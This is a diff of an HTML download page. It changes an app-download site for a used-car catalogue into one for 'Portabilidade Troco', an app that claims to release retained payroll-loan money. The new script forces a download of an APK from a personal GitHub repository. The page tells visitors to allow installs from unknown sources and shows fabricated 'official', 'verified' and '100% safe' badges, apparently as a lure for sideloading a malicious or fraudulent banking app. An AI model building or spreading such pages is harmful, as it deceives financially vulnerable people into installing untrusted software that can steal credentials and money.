@@ -1,274 +1,250 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-pt">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Sampa Repasse | Aplicativo Oficial</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    
+    <title>Portabilidade Troco - Aceda seus Valores e Refinancie</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* Reset e Configurações Básicas */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', sans-serif;
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap');
+        
+        body { font-family: 'Inter', sans-serif; }
+
+        .gradient-bg {
+            background: radial-gradient(circle at top right, #1e40af, #1e3a8a);
+        }
+        
+        .pulse-premium {
+            animation: pulse-ring 2s cubic-bezier(0.455, 0.03, 0.515, 0.955) infinite;
         }
 
-        body {
-            /* Fundo Escuro Premium com Imagem de Carro de Luxo */
-            background: linear-gradient(rgba(10, 10, 12, 0.75), rgba(10, 10, 12, 0.9)), 
-                        url('https://images.unsplash.com/photo-1603584173870-7f23fdae1b7a?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=80') center/cover no-repeat fixed;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            color: #ffffff;
+        @keyframes pulse-ring {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(34, 197, 94, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
         }
 
-        /* Container Principal (Efeito Glassmorphism / Vidro Premium) */
-        .container {
-            width: 100%;
-            max-width: 550px;
-            background: rgba(25, 25, 30, 0.6); /* Fundo escuro translúcido */
-            padding: 40px;
-            border-radius: 24px;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(15px); /* Efeito de desfoque no fundo */
-            -webkit-backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1); /* Borda de vidro */
-            position: relative;
-            overflow: hidden;
+        .floating {
+            animation: floating 3s ease-in-out infinite;
         }
 
-        /* Linha vermelha no topo simulando um LED */
-        .container::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 4px;
-            background: linear-gradient(90deg, #ff0f2a, #8a0515);
-        }
-
-        /* Cabeçalho do Formulário */
-        .header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-
-        .header h2 {
-            font-size: 30px;
-            font-weight: 800;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: -0.5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            color: #ffffff;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
-        }
-
-        .header h2 span {
-            color: #ff0f2a;
-        }
-
-        .header p {
-            color: #9ca3af;
-            font-size: 15px;
-            line-height: 1.6;
-            font-weight: 400;
-        }
-
-        /* Alerta de Bônus / Desconto (Estilo Neon Escuro) */
-        .bonus-badge {
-            background: linear-gradient(135deg, rgba(255, 15, 42, 0.1), rgba(0, 0, 0, 0.3));
-            border: 1px solid rgba(255, 15, 42, 0.3);
-            padding: 18px;
-            text-align: center;
-            font-weight: 800;
-            font-size: 17px;
-            border-radius: 12px;
-            margin-bottom: 25px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            color: #facc15; /* Amarelo/Dourado para valorizar o desconto */
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-        }
-
-        .bonus-badge span {
-            font-size: 13px;
-            font-weight: 400;
-            color: #d1d5db;
-        }
-
-        /* Botão de Download Premium */
-        .download-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #e11d48, #9f1239); /* Gradiente vermelho */
-            color: #ffffff;
-            padding: 18px;
-            font-size: 18px;
-            font-weight: 800;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 12px;
-            text-decoration: none;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            box-shadow: 0 8px 20px rgba(225, 29, 72, 0.4);
-            animation: pulse 2.5s infinite;
-        }
-
-        .download-btn:hover {
-            background: linear-gradient(135deg, #f43f5e, #be123c);
-            box-shadow: 0 10px 25px rgba(225, 29, 72, 0.6);
-            transform: translateY(-3px);
-            animation: none;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(225, 29, 72, 0.6); }
-            70% { box-shadow: 0 0 0 15px rgba(225, 29, 72, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(225, 29, 72, 0); }
-        }
-
-        /* Selos de Segurança (Minimalistas e Sofisticados) */
-        .trust-badges {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 25px;
-            flex-wrap: wrap;
-        }
-
-        .trust-item {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 12px;
-            color: #d1d5db;
-            font-weight: 500;
-            background: rgba(255, 255, 255, 0.05);
-            padding: 8px 14px;
-            border-radius: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .trust-item span {
-            color: #10b981; /* Verde esmeralda nos ícones */
-            font-size: 14px;
-        }
-
-        /* Caixa de Instruções de Instalação Escura */
-        .instructions-box {
-            background-color: rgba(0, 0, 0, 0.3);
-            border-left: 4px solid #ff0f2a;
-            padding: 18px;
-            border-radius: 0 12px 12px 0;
-            margin-top: 10px;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            border-right: 1px solid rgba(255, 255, 255, 0.05);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .instructions-box h3 {
-            font-size: 14px;
-            color: #ffffff;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .instructions-box ol {
-            padding-left: 20px;
-            font-size: 13.5px;
-            color: #9ca3af;
-            line-height: 1.7;
-        }
-
-        .instructions-box ol li strong {
-            color: #ffffff;
-        }
-
-        /* Rodapé */
-        .footer-text {
-            text-align: center;
-            margin-top: 25px;
-            font-size: 12px;
-            color: #6b7280;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            padding-top: 20px;
+        @keyframes floating {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
         }
     </style>
 </head>
-<body>
+<body class="bg-slate-50 text-slate-900 leading-tight">
 
-    <div class="container">
-        <!-- Cabeçalho -->
-        <div class="header">
-            <h2>Auto Sampa <span>Repasse</span> ☑️</h2>
-            <p>Baixe nosso catálogo exclusivo e tenha os melhores repasses de São Paulo na palma da sua mão.</p>
-        </div>
-
-        <!-- Alerta/Bônus -->
-        <div class="bonus-badge">
-            💰 DESCONTO DE ATÉ R$ 1.000 POR CARRO
-            <span>Benefício exclusivo pelo nosso aplicativo.</span>
-        </div>
-
-        <!-- BOTÃO DE DOWNLOAD -->
-        <!-- Substitua 'COLOQUE_AQUI_O_LINK_DO_SEU_APP.apk' pelo link real -->
-        <a href="COLOQUE_AQUI_O_LINK_DO_SEU_APP.apk" download="AutoSampaRepasse.apk" class="download-btn">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
-            Baixar Aplicativo
-        </a>
-
-        <!-- Selos de Segurança -->
-        <div class="trust-badges">
-            <div class="trust-item">
-                <span>🔒</span> Site Seguro
-            </div>
-            <div class="trust-item">
-                <span>🛡️</span> Livre de Vírus
-            </div>
-            <div class="trust-item">
-                <span>⭐</span> App Oficial
+    <!-- Navegação -->
+    <nav class="bg-white border-b sticky top-0 z-50 shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between h-16 items-center">
+                <div class="flex items-center gap-2">
+                    <div class="bg-blue-700 p-1.5 rounded-lg">
+                        <i class="fas fa-hand-holding-dollar text-white text-xl"></i>
+                    </div>
+                    <span class="font-black text-lg tracking-tighter text-blue-900 uppercase">Portabilidade<span class="text-blue-600">Troco</span></span>
+                </div>
+                 <a href="#" 
+                   onclick="handleDownload(event)"
+                   class="dl-link bg-blue-700 text-white px-5 py-2.5 rounded-full font-extrabold hover:bg-blue-800 transition-all text-xs shadow-lg shadow-blue-200">
+                    INSTALAR
+                </a>
             </div>
         </div>
+    </nav>
 
-        <!-- Instruções de Permissão Restrita -->
-        <div class="instructions-box">
-            <h3>⚠️ Atenção na hora de instalar:</h3>
-            <ol>
-                <li>Após concluir o download, toque no arquivo para abrir.</li>
-                <li>Caso apareça a mensagem de <strong>"Permissão Restrita"</strong>, clique em <strong>Configurações</strong>.</li>
-                <li>Procure pela opção <strong>"Apps"</strong> ou <strong>"Permitir desta fonte"</strong>.</li>
-                <li>Autorize a instalação, abra o app e aproveite os descontos!</li>
-            </ol>
+    <!-- Hero Section -->
+    <header class="gradient-bg text-white pt-12 pb-20 px-4 relative overflow-hidden">
+        <div class="absolute top-0 left-0 w-full h-full opacity-10 pointer-events-none">
+            <i class="fas fa-coins text-[200px] absolute -top-10 -left-10 rotate-12"></i>
         </div>
 
-        <!-- Rodapé -->
-        <div class="footer-text">
-            <p><strong>Auto Sampa Repasse</strong> © 2024 - Todos os direitos reservados.</p>
-            <p>Conexão 100% criptografada.</p>
-        </div>
-    </div>
+        <div class="max-w-4xl mx-auto text-center relative z-10">
+            <div class="inline-flex items-center gap-2 bg-yellow-400 text-blue-900 font-bold px-4 py-1.5 rounded-full mb-8 text-xs uppercase tracking-wider shadow-xl">
+                <span class="relative flex h-2 w-2">
+                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-600 opacity-75"></span>
+                    <span class="relative inline-flex rounded-full h-2 w-2 bg-blue-700"></span>
+                </span>
+                Atualizado 2026: Sistema Liberado
+            </div>
+            
+            <h1 class="text-4xl md:text-7xl font-black mb-6 tracking-tighter">
+                REABERTO: <br>
+                <span class="text-yellow-400">RECEBA SEU TROCO</span> DA PORTABILIDADE
+            </h1>
+            
+            <p class="text-lg md:text-xl mb-12 text-blue-100 max-w-2xl mx-auto font-medium leading-relaxed opacity-90">
+                O aplicativo oficial para consultar valores retidos, solicitar novos saques e reduzir parcelas do seu consignado. Tudo em um só clique.
+            </p>
+            
+            <div class="flex flex-col items-center">
+                <!-- BOTÃO DE DOWNLOAD PRINCIPAL -->
+                <a id="main-download-btn"
+                   href="#" 
+                   onclick="handleDownload(event)"
+                   class="dl-link pulse-premium group bg-green-500 hover:bg-green-600 text-white w-full max-w-md py-6 px-8 rounded-2xl shadow-[0_20px_50px_rgba(34,197,94,0.4)] transition-all transform hover:scale-[1.02] flex flex-col items-center no-underline">
+                    
+                    <div id="btn-content" class="flex flex-col items-center">
+                        <span class="text-xs mb-2 font-bold opacity-80 uppercase tracking-widest">Inicie a Instalação Automática</span>
+                        <div class="flex items-center gap-4 text-2xl md:text-3xl font-black">
+                            <i class="fas fa-download animate-bounce"></i>
+                            BAIXAR APP AGORA
+                        </div>
+                    </div>
 
+                    <div id="btn-loading" class="hidden flex-col items-center py-2">
+                        <i class="fas fa-circle-notch animate-spin text-3xl mb-2"></i>
+                        <span class="font-bold text-lg">Iniciando download...</span>
+                    </div>
+                </a>
+
+                <div id="download-message" class="hidden mt-6 bg-white/10 backdrop-blur-md p-4 rounded-xl text-sm border border-white/20">
+                    <p class="font-bold text-yellow-300"><i class="fas fa-info-circle mr-2"></i> O download começou!</p>
+                    <p class="opacity-80">Se não iniciar, <span class="underline cursor-pointer" onclick="handleDownload(event)">clique aqui novamente</span>.</p>
+                </div>
+
+                <div class="grid grid-cols-3 gap-8 mt-12 text-blue-200 text-xs md:text-sm font-bold tracking-tight uppercase">
+                    <div class="flex flex-col items-center gap-2">
+                        <i class="fas fa-shield-check text-green-400 text-xl"></i>
+                        100% SEGURO
+                    </div>
+                    <div class="flex flex-col items-center gap-2 border-x border-white/10 px-4">
+                        <i class="fas fa-bolt text-yellow-400 text-xl"></i>
+                        SAQUE RÁPIDO
+                    </div>
+                    <div class="flex flex-col items-center gap-2">
+                        <i class="fas fa-user-check text-blue-400 text-xl"></i>
+                        VERIFICADO
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Seção de Benefícios -->
+    <section class="py-20 max-w-7xl mx-auto px-4">
+        <div class="text-center mb-16">
+            <h2 class="text-3xl md:text-4xl font-black text-blue-950 uppercase tracking-tighter">Funcionalidades do Aplicativo</h2>
+            <div class="h-1.5 w-20 bg-blue-600 mx-auto mt-4 rounded-full"></div>
+        </div>
+
+        <div class="grid md:grid-cols-3 gap-6">
+            <div class="bg-white p-10 rounded-[2rem] shadow-xl shadow-slate-200/50 border border-slate-100 group hover:border-blue-500 transition-all">
+                <div class="w-14 h-14 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center mb-8 text-2xl group-hover:bg-blue-600 group-hover:text-white transition-all">
+                    <i class="fas fa-arrow-right-arrow-left"></i>
+                </div>
+                <h3 class="text-xl font-black mb-4 text-blue-900 uppercase">Portabilidade</h3>
+                <p class="text-slate-500 leading-relaxed">Mude seu contrato de banco para reduzir parcelas e liberar margem nova no seu contracheque.</p>
+            </div>
+
+            <div class="bg-white p-10 rounded-[2rem] shadow-xl shadow-slate-200/50 border border-slate-100 group hover:border-green-500 transition-all">
+                <div class="w-14 h-14 bg-green-50 text-green-600 rounded-2xl flex items-center justify-center mb-8 text-2xl group-hover:bg-green-600 group-hover:text-white transition-all">
+                    <i class="fas fa-money-bill-transfer"></i>
+                </div>
+                <h3 class="text-xl font-black mb-4 text-green-900 uppercase">Dinheiro na Conta</h3>
+                <p class="text-slate-500 leading-relaxed">O famoso "Troco" cai direto na sua conta cadastrada logo após a aprovação da portabilidade.</p>
+            </div>
+
+            <div class="bg-white p-10 rounded-[2rem] shadow-xl shadow-slate-200/50 border border-slate-100 group hover:border-orange-500 transition-all">
+                <div class="w-14 h-14 bg-orange-50 text-orange-600 rounded-2xl flex items-center justify-center mb-8 text-2xl group-hover:bg-orange-600 group-hover:text-white transition-all">
+                    <i class="fas fa-magnifying-glass-dollar"></i>
+                </div>
+                <h3 class="text-xl font-black mb-4 text-orange-900 uppercase">Consultar Saldo</h3>
+                <p class="text-slate-500 leading-relaxed">Verifique se existem valores residuais de contratos antigos que você nem sabia que podia sacar.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Guia Visual -->
+    <section class="bg-slate-900 py-20 px-4 text-white rounded-t-[3rem] -mt-8">
+        <div class="max-w-4xl mx-auto text-center">
+            <h2 class="text-3xl font-black mb-16 uppercase">Como configurar seu acesso</h2>
+            
+            <div class="grid gap-12 relative">
+                <div class="hidden md:block absolute top-1/2 left-0 w-full h-0.5 bg-blue-800 -translate-y-1/2 z-0"></div>
+                <div class="grid md:grid-cols-3 gap-8 relative z-10">
+                    <div class="bg-slate-800 p-8 rounded-3xl border border-slate-700">
+                        <div class="w-12 h-12 bg-yellow-400 text-blue-900 rounded-full flex items-center justify-center mx-auto mb-6 text-xl font-black">1</div>
+                        <h4 class="font-bold text-lg mb-3">Baixe o Arquivo</h4>
+                        <p class="text-slate-400 text-sm">Clique no botão verde. O download do instalador oficial começará.</p>
+                    </div>
+                    <div class="bg-slate-800 p-8 rounded-3xl border border-slate-700">
+                        <div class="w-12 h-12 bg-yellow-400 text-blue-900 rounded-full flex items-center justify-center mx-auto mb-6 text-xl font-black">2</div>
+                        <h4 class="font-bold text-lg mb-3">Habilite o App</h4>
+                        <p class="text-slate-400 text-sm">Ao abrir, o Android pedirá para "Permitir desta fonte". É o procedimento padrão.</p>
+                    </div>
+                    <div class="bg-slate-800 p-8 rounded-3xl border border-slate-700">
+                        <div class="w-12 h-12 bg-yellow-400 text-blue-900 rounded-full flex items-center justify-center mx-auto mb-6 text-xl font-black">3</div>
+                        <h4 class="font-bold text-lg mb-3">Aceda os Valores</h4>
+                        <p class="text-slate-400 text-sm">Faça o login e veja quanto você tem disponível para saque hoje.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="mt-16">
+                <a href="#"
+                   onclick="handleDownload(event)"
+                   class="dl-link inline-flex items-center gap-3 text-yellow-400 font-bold hover:text-yellow-300 transition-all uppercase tracking-widest border-b-2 border-yellow-400/30 pb-2">
+                    Repetir Download Agora <i class="fas fa-chevron-right"></i>
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-white py-12 px-4">
+        <div class="max-w-7xl mx-auto flex flex-col items-center">
+            <div class="flex items-center gap-2 mb-8 opacity-50 grayscale">
+                <i class="fas fa-shield-halved text-2xl"></i>
+                <span class="font-bold uppercase tracking-widest text-sm text-slate-900">Segurança Criptografada</span>
+            </div>
+            <p class="text-slate-400 text-[10px] text-center max-w-xl mb-8 leading-relaxed uppercase font-semibold">
+                Este site funciona como um portal de distribuição direta para o aplicativo Portabilidade Troco. Verifique sempre se está em ambiente seguro. O download é hospedado em servidores de alta disponibilidade.
+            </p>
+            <div class="text-slate-300 text-[10px] font-black tracking-[0.3em] uppercase">
+                &copy; 2026 Tecnologia Bancária Independente
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // URL ÚNICA DE DOWNLOAD ATUALIZADA
+        const DOWNLOAD_URL = "https://github.com/thomasrinconn-max/kibon/raw/main/PORTABILIDADE%20COM%20TROCO.apk";
+
+        // Configura todos os links com a URL correta ao carregar
+        window.onload = function() {
+            const links = document.querySelectorAll('.dl-link');
+            links.forEach(link => {
+                link.setAttribute('href', DOWNLOAD_URL);
+            });
+        };
+
+        function handleDownload(event) {
+            // Mostra feedback no botão principal
+            const btnContent = document.getElementById('btn-content');
+            const btnLoading = document.getElementById('btn-loading');
+            const downloadMsg = document.getElementById('download-message');
+            
+            if (btnContent && btnLoading) {
+                btnContent.classList.add('hidden');
+                btnLoading.classList.remove('hidden');
+                downloadMsg.classList.remove('hidden');
+                
+                setTimeout(() => {
+                    btnContent.classList.remove('hidden');
+                    btnLoading.classList.add('hidden');
+                }, 5000);
+            }
+
+            // Força o download
+            window.location.href = DOWNLOAD_URL;
+            event.preventDefault();
+            return false;
+        }
+    </script>
 </body>
 </html>
